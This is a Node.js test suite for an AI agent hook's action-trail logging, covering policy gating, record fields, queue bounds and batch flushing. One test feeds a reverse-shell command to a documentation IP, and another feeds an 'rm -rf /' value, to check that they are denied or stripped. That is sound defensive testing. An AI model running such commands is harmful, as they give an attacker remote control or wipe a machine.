// The allow trail (policy key `actionTrail`, cli/action-trail.mjs), pinned to the contract the console
// builds against:
//   1. off unless the SIGNED policy says "allowed": an allowed call then writes no record;
//   2. on: one record per allowed PreToolUse call with exactly the contract fields, and none of the call's
//      argument, path or URL text;
//   3. the queue is bounded (records and bytes), oldest dropped first, and the drop is counted;
//   4. the flush posts { v: 1, records } batches to /api/actions and keeps every record on 404 / 501;
//   5. the hook process never posts to /api/actions itself: a due flush goes to the detached worker;
//   6. the session summary carries actionsRecorded and actionTrailDropped while the trail is on.
//
//   node --test --import ./test/hermetic-env.mjs test/action-trail.test.mjs
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, existsSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { generateKeyPairSync, sign as edSign } from "node:crypto";
import http from "node:http";
import { policyCanonical, policyDigest, POLICY_SIG_VERSION, publicKeyId } from "../cli/hook-core.mjs";
import { rmTree } from "./fs-cleanup.mjs";

const ROOT = join(dirname(fileURLToPath(import.meta.url)), "..");
const HOOK = join(ROOT, "cli", "moorai-hook.mjs");
const TRAIL = () => import("../cli/action-trail.mjs");
const PKG_VERSION = JSON.parse(readFileSync(join(ROOT, "package.json"), "utf8")).version;
const TENANT = "acme";
const TOKEN = "tok-action-trail";
const key = generateKeyPairSync("ed25519");
const pubkeyBody = JSON.stringify({ tenant: TENANT, alg: "ed25519", publicKey: publicKeyId(key.publicKey) });
function signed(policy) {
  const iat = new Date().toISOString();
  const sig = edSign(null, Buffer.from(policyCanonical({ v: POLICY_SIG_VERSION, tenant: TENANT, iat, digest: policyDigest(policy) })), key.privateKey).toString("base64");
  return JSON.stringify({ ...policy, policySig: { v: POLICY_SIG_VERSION, alg: "ed25519", tenant: TENANT, iat, sig } });
}
const ON = () => signed({ captureTier: "content-free", actionTrail: "allowed" });
const OFF = () => signed({ captureTier: "content-free" });
const SUMMARY = "Agent session summary";
// Distinctive argument text: none of it may reach a record.
const PATH_TEXT = "zz-trail-path-4821";
const URL_TEXT = "trail-canary-9931.example.invalid";
const BENIGN = `ls -la /tmp/${PATH_TEXT} && echo https://${URL_TEXT}/q?k=v9931`;
const CONTRACT = ["ts", "session", "seq", "event", "tool", "toolTags", "mcpServer", "decision", "basis", "policyIat", "agentName", "agentVersion", "appVersion", "user", "device", "platform", "tenant", "actor", "contentHash", "traceId", "spanId", "parentSpanId", "contextRoot", "contextSize", "contextSession", "provider", "model", "origin"];
// Fields a top-level hook call's record does not carry: parentSpanId and contextSession (a sub-agent's records
// only), provider and model (the model proxy's records only).
const NOT_ON_HOOK = ["parentSpanId", "contextSession", "provider", "model"];

// A console: serves the policy given by state.policy (a function, so each fetch is freshly signed), and
// records every POST. /api/actions answers state.actionsStatus after state.actionsDelayMs.
async function consoleServer(policy) {
  const alerts = [], actions = [];
  const state = { policy, actionsStatus: 404, actionsDelayMs: 0 };
  const srv = http.createServer((req, res) => {
    let body = "";
    req.on("data", (d) => (body += d));
    req.on("end", () => {
      if (req.method === "POST" && req.url === "/api/actions") {
        actions.push({ at: Date.now(), token: req.headers["x-install-token"], body: JSON.parse(body) });
        return setTimeout(() => { res.writeHead(state.actionsStatus); res.end("{}"); }, state.actionsDelayMs);
      }
      if (req.method === "POST") { try { if (req.url === "/api/alerts") alerts.push(JSON.parse(body)); } catch { /* ignore */ } res.writeHead(201); return res.end("{}"); }
      if (req.url.startsWith("/api/policy/pubkey")) { res.writeHead(200, { "content-type": "application/json" }); return res.end(pubkeyBody); }
      if (req.url.startsWith("/api/policy")) { res.writeHead(200, { "content-type": "application/json" }); return res.end(state.policy()); }
      res.writeHead(404); res.end();
    });
  });
  await new Promise((r) => srv.listen(0, "127.0.0.1", r));
  return { url: `http://127.0.0.1:${srv.address().port}`, alerts, actions, state, close: () => new Promise((r) => { srv.closeAllConnections?.(); srv.close(r); }) };
}
function sandbox(c) {
  const home = mkdtempSync(join(tmpdir(), "moorai-trail-"));
  mkdirSync(join(home, ".moorai"), { recursive: true });
  mkdirSync(join(home, "proj"), { recursive: true });
  writeFileSync(join(home, ".moorai", "config.json"), JSON.stringify({ serverUrl: c.url, tenant: TENANT, installToken: TOKEN }));
  return home;
}
function runHook(home, payload, extraEnv = {}) {
  const proj = join(home, "proj");
  const t0 = Date.now();
  return new Promise((res) => {
    const c = spawn(process.execPath, [HOOK], { cwd: proj, env: { PATH: process.env.PATH || "/usr/bin:/bin", HOME: home, USERPROFILE: home, CLAUDE_PROJECT_DIR: proj, ...extraEnv } });
    let out = "", err = "";
    c.stdout.on("data", (d) => (out += d)); c.stderr.on("data", (d) => (err += d));
    c.on("close", (status) => res({ status, out, err, ms: Date.now() - t0 }));
    c.stdin.end(JSON.stringify({ session_id: "sess-trail", cwd: proj, ...payload }));
  });
}
const bash = (command) => ({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command } });
const queuePath = (home) => join(home, ".moorai", "action-trail.jsonl");
const queued = (home) => { try { return readFileSync(queuePath(home), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)); } catch { return []; } };
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function until(fn, ms = 15000) { const end = Date.now() + ms; while (Date.now() < end) { if (fn()) return true; await sleep(100); } return fn(); }

// ---- 1. off by default ----
test("off by default: an allowed call under a signed policy with no actionTrail writes no record", async () => {
  const c = await consoleServer(OFF);
  const home = sandbox(c);
  try {
    const r = await runHook(home, bash(BENIGN));
    assert.equal(r.status, 0, r.err);
    assert.equal(r.out.trim(), "", "allowed: no decision output");
    assert.equal(existsSync(queuePath(home)), false, "no queue file");
    assert.equal(c.actions.length, 0);
  } finally { await c.close(); rmTree(home); }
});

test("off: an UNSIGNED policy body saying actionTrail \"allowed\" does not turn the trail on", async () => {
  const c = await consoleServer(() => JSON.stringify({ captureTier: "content-free", actionTrail: "allowed" }));
  const home = sandbox(c);
  try {
    assert.equal((await runHook(home, bash(BENIGN))).status, 0);
    assert.equal(existsSync(queuePath(home)), false);
  } finally { await c.close(); rmTree(home); }
});

// ---- 2. on: the record ----
test("on: one record per allowed call with exactly the contract fields, and no argument, path or URL text", async () => {
  const c = await consoleServer(ON);
  const home = sandbox(c);
  try {
    const r = await runHook(home, bash(BENIGN), { AI_AGENT: "claude-code_2-1-300_harness" });
    assert.equal(r.status, 0, r.err);
    const recs = queued(home);
    assert.equal(recs.length, 1, `one record: ${JSON.stringify(recs)}`);
    const rec = recs[0];
    assert.deepEqual(Object.keys(rec).sort(), CONTRACT.filter((k) => k !== "mcpServer" && !NOT_ON_HOOK.includes(k)).sort(), "exactly the contract fields (no mcpServer on a non-MCP tool)");
    assert.equal(rec.event, "PreToolUse");
    assert.equal(rec.decision, "allow");
    assert.equal(rec.tool, "Bash");
    assert.ok(["rule", "default", "exception"].includes(rec.basis));
    assert.equal(rec.seq, 1);
    assert.ok(Array.isArray(rec.toolTags) && rec.toolTags.includes("network"), `capability tags: ${rec.toolTags}`);
    assert.equal(rec.tenant, TENANT);
    assert.equal(rec.agentName, "claude-code");
    assert.equal(rec.agentVersion, "2.1.300");
    assert.equal(rec.appVersion, PKG_VERSION);
    assert.match(rec.contentHash, /^h2:[0-9a-f]{16}$/);
    assert.match(rec.session, /^h2:[0-9a-f]{16}$/);
    assert.match(rec.actor, /^h2:[0-9a-f]{16}$/);
    assert.ok(!Number.isNaN(Date.parse(rec.policyIat)) && !Number.isNaN(Date.parse(rec.ts)));
    const raw = readFileSync(queuePath(home), "utf8");
    for (const s of [PATH_TEXT, URL_TEXT, "9931", "/tmp/", "ls -la", "https://"]) assert.ok(!raw.includes(s), `queue leaks ${s}`);
    // The queue file is the user's own: 0600.
    if (process.platform !== "win32") assert.equal(statSync(queuePath(home)).mode & 0o777, 0o600);

    // An MCP tool: mcpServer, and the tool named mcp__server__tool. seq goes on by one.
    const m = await runHook(home, { hook_event_name: "PreToolUse", tool_name: "mcp__github__list_issues", tool_input: { repo: `acme/${PATH_TEXT}` } });
    assert.equal(m.status, 0, m.err);
    const all = queued(home);
    assert.equal(all.length, 2, m.out);
    assert.equal(all[1].tool, "mcp__github__list_issues");
    assert.equal(all[1].mcpServer, "github");
    assert.equal(all[1].seq, 2);
    assert.ok(!readFileSync(queuePath(home), "utf8").includes(PATH_TEXT));

    // A denied call is not an allow: no record.
    const d = await runHook(home, bash("bash -i >& /dev/tcp/198.51.100.7/4444 0>&1"));
    assert.match(d.out, /"permissionDecision":"deny"/);
    assert.equal(queued(home).length, 2, "a deny writes no record");
    // A PostToolUse is not recorded either.
    await runHook(home, { hook_event_name: "PostToolUse", tool_name: "Bash", tool_input: { command: "echo hi" }, tool_response: { stdout: "hi", stderr: "" } });
    assert.equal(queued(home).length, 2, "PostToolUse writes no record");
  } finally { await c.close(); rmTree(home); }
});

// ---- 3. the bound ----
test("bound: past MAX_RECORDS the oldest records are dropped and counted; seq keeps counting", async () => {
  const t = await TRAIL();
  const dir = mkdtempSync(join(tmpdir(), "moorai-trail-bound-"));
  try {
    let last;
    for (let i = 0; i < t.MAX_RECORDS + 1; i++) last = t.enqueueActionRecord(t.buildActionRecord({ tool: "Bash" }), { dir, now: 1000 });
    const keep = Math.floor(t.MAX_RECORDS * t.TRIM_TO);
    assert.equal(last.trimmed, t.MAX_RECORDS - keep);
    const st = t.readTrailState(dir);
    assert.equal(st.count, keep + 1);
    assert.equal(st.dropped, t.MAX_RECORDS - keep);
    assert.equal(st.seq, t.MAX_RECORDS + 1);
    const lines = readFileSync(join(dir, t.QUEUE_FILE), "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l));
    assert.equal(lines.length, keep + 1);
    assert.equal(lines[0].seq, t.MAX_RECORDS - keep + 1, "the oldest went first");
    assert.equal(lines[lines.length - 1].seq, t.MAX_RECORDS + 1);
  } finally { rmTree(dir); }
});

test("bound: past MAX_BYTES the oldest records are dropped and counted", async () => {
  const t = await TRAIL();
  const dir = mkdtempSync(join(tmpdir(), "moorai-trail-bytes-"));
  try {
    const pad = "x".repeat(2000);
    let n = 0, last;
    do { last = t.enqueueActionRecord({ ...t.buildActionRecord({ tool: "Bash" }), pad }, { dir, now: 1000 }); n++; } while (!last.trimmed && n < 5000);
    assert.ok(last.trimmed > 0, "the byte bound trimmed");
    assert.ok(n < t.MAX_RECORDS, "before the record bound");
    const size = statSync(join(dir, t.QUEUE_FILE)).size;
    assert.ok(size <= t.MAX_BYTES * t.TRIM_TO + 4096, `queue back under the trim mark: ${size}`);
    assert.equal(t.readTrailState(dir).dropped, last.trimmed);
  } finally { rmTree(dir); }
});

// ---- 4. the flush ----
test("flush: posts { v: 1, records } with the install token; 404 and 501 keep every record and back off; 2xx removes them", async () => {
  const t = await TRAIL();
  const c = await consoleServer(OFF);
  const dir = mkdtempSync(join(tmpdir(), "moorai-trail-flush-"));
  const config = { serverUrl: c.url, tenant: TENANT, installToken: TOKEN };
  const noBackoff = () => ({ active: false });
  try {
    for (let i = 0; i < 3; i++) t.enqueueActionRecord(t.buildActionRecord({ tool: "Bash" }), { dir });
    for (const code of [404, 501]) {
      c.state.actionsStatus = code;
      const r = await t.flushActionTrail({ config, dir, backoff: noBackoff });
      assert.equal(r.status, "rejected");
      assert.equal(r.httpStatus, code);
      const st = t.readTrailState(dir);
      assert.equal(st.count, 3, `kept on ${code}`);
      assert.ok(st.retryAt > Date.now(), "a retry time is set");
      assert.equal(st.lease, 0, "the lease is released");
    }
    assert.equal(c.actions.length, 2);
    // While retryAt is in the future, no call claims a flush: a console that is not ready is not hammered.
    assert.equal(t.claimFlush({ dir, force: true }), false);
    c.state.actionsStatus = 202;
    const ok = await t.flushActionTrail({ config, dir, backoff: noBackoff });
    assert.equal(ok.status, "posted");
    assert.equal(ok.posted, 3);
    const last = c.actions[c.actions.length - 1];
    assert.equal(last.token, TOKEN);
    assert.equal(last.body.v, 1);
    assert.deepEqual(last.body.records.map((r) => r.seq), [1, 2, 3]);
    assert.equal(t.readTrailState(dir).count, 0);
    assert.equal(readFileSync(join(dir, t.QUEUE_FILE), "utf8"), "");
    // Batches of at most BATCH_MAX.
    for (let i = 0; i < t.BATCH_MAX * 2 + 7; i++) t.enqueueActionRecord(t.buildActionRecord({ tool: "Read" }), { dir });
    const before = c.actions.length;
    const big = await t.flushActionTrail({ config, dir, backoff: noBackoff });
    assert.equal(big.posted, t.BATCH_MAX * 2 + 7);
    assert.deepEqual(c.actions.slice(before).map((a) => a.body.records.length), [t.BATCH_MAX, t.BATCH_MAX, 7]);
    // The console back-off: nothing is sent while it is active.
    t.enqueueActionRecord(t.buildActionRecord({ tool: "Read" }), { dir });
    const n = c.actions.length;
    const bo = await t.flushActionTrail({ config, dir, backoff: () => ({ active: true }) });
    assert.equal(bo.status, "console-backoff");
    assert.equal(c.actions.length, n);
    assert.equal(t.readTrailState(dir).count, 1);
  } finally { await c.close(); rmTree(dir); }
});

test("flush: a console that does not answer keeps every record", async () => {
  const t = await TRAIL();
  const dir = mkdtempSync(join(tmpdir(), "moorai-trail-down-"));
  try {
    t.enqueueActionRecord(t.buildActionRecord({ tool: "Bash" }), { dir });
    const r = await t.flushActionTrail({ config: { serverUrl: "http://127.0.0.1:9", tenant: TENANT, installToken: TOKEN }, dir, backoff: () => ({ active: false }) });
    assert.equal(r.status, "unreachable");
    assert.equal(t.readTrailState(dir).count, 1);
  } finally { rmTree(dir); }
});

// ---- 5. no per-call network ----
test("no per-call network: below the flush threshold the hook sends nothing to /api/actions", async () => {
  const c = await consoleServer(ON);
  const home = sandbox(c);
  try {
    for (let i = 0; i < 3; i++) assert.equal((await runHook(home, bash(`echo ${i}`))).status, 0);
    assert.equal(queued(home).length, 3);
    await sleep(1500);
    assert.equal(c.actions.length, 0, "no /api/actions request");
  } finally { await c.close(); rmTree(home); }
});

test("no per-call network: the call that makes a flush due returns before the console answers; the detached worker posts the batch", async () => {
  const t = await TRAIL();
  const c = await consoleServer(ON);
  const home = sandbox(c);
  try {
    const dir = join(home, ".moorai");
    for (let i = 0; i < t.FLUSH_AT_RECORDS - 1; i++) t.enqueueActionRecord(t.buildActionRecord({ tool: "Read" }), { dir });
    c.state.actionsStatus = 202;
    c.state.actionsDelayMs = 6000; // a hook that waited on the post would take at least this long
    const r = await runHook(home, bash("echo flush"));
    assert.equal(r.status, 0, r.err);
    assert.ok(r.ms < 4000, `the hook returned in ${r.ms} ms`);
    assert.ok(await until(() => c.actions.length > 0), "the worker posted");
    assert.equal(c.actions[0].body.records.length, t.FLUSH_AT_RECORDS);
    assert.ok(await until(() => t.readTrailState(dir).count === 0, 15000), "the posted records left the queue");
  } finally { await c.close(); rmTree(home); }
});

// ---- 6. the session summary ----
test("summary: actionsRecorded and actionTrailDropped while the trail is on; absent while it is off", async () => {
  for (const mode of ["on", "off"]) {
    const c = await consoleServer(mode === "on" ? ON : OFF);
    const home = sandbox(c);
    try {
      // A dropped count the queue already holds (from an earlier trim on this device).
      writeFileSync(join(home, ".moorai", "action-trail-state.json"), JSON.stringify({ seq: 0, count: 0, bytes: 0, oldest: 0, dropped: 7 }));
      for (const cmd of ["echo a", "echo b"]) assert.equal((await runHook(home, bash(cmd))).status, 0);
      assert.equal((await runHook(home, { hook_event_name: "Stop", last_assistant_message: "done" })).status, 0);
      assert.ok(await until(() => c.alerts.some((a) => a.category === SUMMARY)), "no session summary");
      const sum = c.alerts.find((a) => a.category === SUMMARY).summary;
      if (mode === "on") {
        assert.equal(sum.actionsRecorded, 2);
        assert.equal(sum.actionTrailDropped, 7);
        // Session end flushes what is queued (the stub answers 404: kept, but asked once).
        assert.ok(await until(() => c.actions.length === 1), "Stop flushed the queue");
        assert.equal(c.actions[0].body.records.length, 2);
      } else {
        assert.equal("actionsRecorded" in sum, false);
        assert.equal("actionTrailDropped" in sum, false);
        assert.equal(c.actions.length, 0);
      }
    } finally { await c.close(); rmTree(home); }
  }
});

// ---- 7. the console takes every record the agent sends ----
// The console's tool-name rule (RAISEME-server server/action-trail.js toolName): 1-256 code points after
// NFKC, no control, format or surrogate code unit, no whitespace.
const CONSOLE_TOOL_OK = (n) => typeof n === "string" && n.length > 0 && n === n.normalize("NFKC") && !/[\p{Cc}\p{Cf}\p{Cs}\p{Z}\s]/u.test(n) && [...n].length <= 256;

test("tool name: sanitised to the console's rule before queueing, so no record is rejected for its name", async () => {
  const t = await TRAIL();
  const cases = {
    "mcp__srv__a:b": "mcp__srv__a:b", "mcp__x/y@z": "mcp__x/y@z", "ツール": "ツール", "Bash": "Bash",
    "mcp__a b\tc": "mcp__a_b_c", "x\u0000y\u007f": "x_y_", "‮bash": "_bash", "ｆｕｌｌ": "full", "a b": "a_b",
    "": "unknown", "\ud800x": "_x"
  };
  for (const [raw, want] of Object.entries(cases)) assert.equal(t.sanitizeToolName(raw), want, JSON.stringify(raw));
  assert.equal(t.sanitizeToolName(42), "unknown");
  const long = t.sanitizeToolName("\u{1F600}".repeat(300));
  assert.equal([...long].length, 256, "truncated by code point, no half surrogate pair");
  assert.equal(t.sanitizeToolName("x".repeat(300)), "x".repeat(256));
  const fuzz = ["ﷺ".repeat(40), "é".repeat(200), "가".repeat(200), "\u{1F600}‍".repeat(200), "a b　c\u0085d"];
  for (const raw of [...Object.keys(cases), ...fuzz, "x".repeat(300)]) assert.ok(CONSOLE_TOOL_OK(t.sanitizeToolName(raw)), JSON.stringify(raw).slice(0, 40));
  assert.equal(t.buildActionRecord({ tool: "mcp__a b" }).tool, "mcp__a_b", "the record carries the sanitised name");
});

test("builder: RECORD_FIELDS is the contract; provider (enum), model (shape), event (token) and contextRoot/contextSize are validated or left out", async () => {
  const t = await TRAIL();
  assert.deepEqual([...t.RECORD_FIELDS].sort(), [...CONTRACT].sort());
  const ROOT64 = "ab".repeat(32);
  const ok = t.buildActionRecord({ tool: "model-proxy:openai", event: "ModelRequest", provider: "openai", model: "gpt-4o-mini:2024/x@v1.2-a_b", contextRoot: ROOT64, contextSize: 7 });
  assert.deepEqual([ok.event, ok.provider, ok.model, ok.contextRoot, ok.contextSize], ["ModelRequest", "openai", "gpt-4o-mini:2024/x@v1.2-a_b", ROOT64, 7]);
  for (const p of ["anthropic", "openai", "google", "ollama", "other"]) assert.equal(t.buildActionRecord({ provider: p }).provider, p);
  const bad = t.buildActionRecord({ tool: "x", event: "Pre Tool<Use>", provider: "azure", model: "has space", contextRoot: ROOT64.toUpperCase(), contextSize: 3 });
  for (const k of ["provider", "model", "contextRoot", "contextSize"]) assert.equal(k in bad, false, k);
  assert.equal(bad.event, "PreToolUse", "an invalid event falls back to the default");
  assert.equal(t.buildActionRecord({ tool: "x" }).event, "PreToolUse", "default event");
  assert.equal("model" in t.buildActionRecord({ model: "m".repeat(65) }), false, "model over 64 characters is dropped");
  assert.equal(t.buildActionRecord({ model: "m".repeat(64) }).model, "m".repeat(64));
  assert.equal("contextRoot" in t.buildActionRecord({ contextRoot: ROOT64 }), false, "a root without a size is left out");
  assert.equal("contextRoot" in t.buildActionRecord({ contextRoot: ROOT64, contextSize: -1 }), false);
  assert.equal("event" in t.buildActionRecord({ event: "x".repeat(33) }) && t.buildActionRecord({ event: "x".repeat(33) }).event, "PreToolUse");
});

test("builder: contextSession (the keyed id of the tree contextRoot belongs to) is kept only alongside contextRoot, only when it is not the session, and only in the session's keyed-id form", async () => {
  const t = await TRAIL();
  const ROOT64 = "cd".repeat(32), SESSION = "h2:0123456789abcdef", KID = "h2:fedcba9876543210";
  const ctx = { session: SESSION, contextRoot: ROOT64, contextSize: 4 };
  const ok = t.buildActionRecord({ tool: "Bash", ...ctx, contextSession: KID });
  assert.deepEqual([ok.session, ok.contextRoot, ok.contextSize, ok.contextSession], [SESSION, ROOT64, 4, KID]);
  assert.equal(t.buildActionRecord({ tool: "Bash", contextRoot: ROOT64, contextSize: 1, contextSession: KID }).contextSession, KID, "no session on the record: still a different tree");
  assert.equal(t.buildActionRecord({ tool: "Bash", ...ctx, contextSession: "A".repeat(128) }).contextSession, "A".repeat(128));
  for (const [why, f] of [
    ["the same tree as the session", { ...ctx, contextSession: SESSION }],
    ["no contextRoot", { session: SESSION, contextSession: KID }],
    ["a contextRoot that was dropped", { session: SESSION, contextRoot: ROOT64.toUpperCase(), contextSize: 4, contextSession: KID }],
    ["no contextSize", { session: SESSION, contextRoot: ROOT64, contextSession: KID }],
    ["the no-key sentinel", { ...ctx, contextSession: "h2:nokey" }],
    ["not the keyed-id form", { ...ctx, contextSession: "h2:abc/../x" }],
    ["a space", { ...ctx, contextSession: "h2:abc def" }],
    ["over 128 characters", { ...ctx, contextSession: "A".repeat(129) }],
    ["empty", { ...ctx, contextSession: "" }],
    ["not a string", { ...ctx, contextSession: 42 }]
  ]) assert.equal("contextSession" in t.buildActionRecord({ tool: "Bash", ...f }), false, why);
});

test("builder: origin is kept only in the origin table's shape, kind and status re-derived from its basis", async () => {
  const t = await TRAIL();
  const o = { v: 1, kind: "agent", status: "inferred", basis: "no-moorai-ask", thread: "main", hostPrompt: "unknown" };
  assert.deepEqual(t.buildActionRecord({ tool: "Bash", origin: o }).origin, o);
  assert.equal(t.buildActionRecord({ tool: "Bash", origin: { ...o, status: "observed" } }).origin.status, "inferred", "never upgraded");
  assert.equal("origin" in t.buildActionRecord({ tool: "Bash", origin: { ...o, basis: "made-up" } }), false);
  assert.equal("origin" in t.buildActionRecord({ tool: "Bash", origin: "agent" }), false);
  assert.equal("origin" in t.buildActionRecord({ tool: "Bash" }), false);
  assert.equal("cmd" in t.buildActionRecord({ tool: "Bash", origin: { ...o, cmd: "rm -rf /" } }).origin, false);
});

test("queue age: at flush time records older than 89 days are dropped and counted in actionTrailDropped, not sent to be rejected", async () => {
  const t = await TRAIL();
  const c = await consoleServer(OFF);
  c.state.actionsStatus = 200;
  const dir = mkdtempSync(join(tmpdir(), "moorai-trail-age-"));
  const DAY = 86400000, NOW = Date.now();
  try {
    t.enqueueActionRecord(t.buildActionRecord({ tool: "Bash", ts: new Date(NOW - 95 * DAY).toISOString() }), { dir });
    t.enqueueActionRecord(t.buildActionRecord({ tool: "Bash", ts: new Date(NOW - 89 * DAY - 60000).toISOString() }), { dir });
    t.enqueueActionRecord(t.buildActionRecord({ tool: "Read", ts: new Date(NOW - 88 * DAY).toISOString() }), { dir });
    t.enqueueActionRecord(t.buildActionRecord({ tool: "Read", ts: new Date(NOW).toISOString() }), { dir });
    const r = await t.flushActionTrail({ config: { serverUrl: c.url, tenant: TENANT, installToken: TOKEN }, dir, backoff: () => ({ active: false }), now: () => NOW });
    assert.equal(r.status, "posted");
    assert.equal(r.droppedAged, 2);
    assert.deepEqual(c.actions.flatMap((a) => a.body.records.map((x) => x.seq)), [3, 4], "only records the console would accept are sent");
    const st = t.readTrailState(dir);
    assert.equal(st.dropped, 2, "counted where the summary's actionTrailDropped reads it");
    assert.equal(st.count, 0);
  } finally { await c.close(); rmTree(dir); }
});
